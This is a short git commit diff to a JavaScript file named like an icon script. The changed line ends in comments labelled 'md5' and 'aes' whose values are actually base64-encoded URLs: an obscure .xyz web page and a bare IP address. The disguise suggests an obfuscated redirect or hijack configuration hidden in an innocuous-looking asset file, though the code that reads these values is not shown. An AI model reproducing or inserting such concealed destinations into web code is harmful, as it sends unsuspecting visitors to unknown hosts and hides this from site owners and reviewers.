9dcc019699aaaa2c68b48d61bb48c4c873f9701c
caocao <caocaodajun@gmail.com>
2022-02-12 12:30:04 +0800

    init

--- js/icon_tecf6t.js
+++ js/icon_tecf6t.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly9tLmJhaWR1LmNvbQ==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cuYW5kY3FlYmgueHl6L2luZGV4L2luZGV4L2hvbWUuaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
